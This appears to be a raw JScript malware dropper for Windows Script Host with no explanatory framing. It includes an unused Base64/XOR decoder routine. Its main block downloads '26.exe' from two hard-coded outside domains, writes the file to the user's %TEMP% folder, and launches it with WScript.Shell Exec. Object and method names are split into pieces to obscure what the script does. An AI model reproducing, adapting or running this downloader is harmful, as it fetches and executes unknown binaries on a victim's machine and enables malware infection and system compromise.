var decode = function (packedText) {
    var cipher ="FRICVuNtlR4PYdTM";

    var Base64 = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        decode: function (input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = Base64._utf8_decode(output);

            return output;

        },
        _utf8_decode: function (utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                }
                else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                }
                else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }
            return string;
        }
    };

    var text = Base64.decode(packedText);

    var cipherLength = cipher.length;
    var result = "";
    for (var i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ cipher.charCodeAt(i % cipherLength));
    }
    return result;
};
(function() {
    var statusOk = 200;
    var get = "GET";
    var exec = "Exec";
    var wscriptShell = "WScript.Shell";
    var xmlHttp = "MSXML2.XMLHTTP";
    var adodb = "ADODB";
    var stream = "Stream";
    var temp = "%TEMP%\\";
    var exe = ".exe";
    var minSize = 2e5;
    var urls = [ "http://helloworldqqq.com/26.exe", "http://wtfisgoinghereff.com/26.exe" ];
    var filename = 524288;
    var shellObject = WScript.CreateObject(wscriptShell);
    var httpObject = WScript.CreateObject(xmlHttp);
    var streamObject = WScript.CreateObject(adodb + "." + stream);
    var tempDir = shellObject.ExpandEnvironmentStrings(temp);
    var exePath = tempDir + filename + exe;
    var success = false;
    for (var i = 0; i < urls.length; i++) {
        try {
            var url = urls[i];
            httpObject.open(get, url, false);
            httpObject.send();
            if (httpObject.status == statusOk) {
                try {
                    streamObject.open();
                    streamObject.type = 1;
                    streamObject.write(httpObject.responseBody);
                    if (streamObject.size > minSize) {
                        i = urls.length;
                        streamObject.position = 0;
                        streamObject.saveToFile(exePath, 2);
                        success = true;
                    }
                } finally {
                    streamObject.close();
                }
            }
        } catch (ignored) {}
    }
    if (success) {
        shellObject[exec](tempDir + Math.pow(2, 19));
    }
})();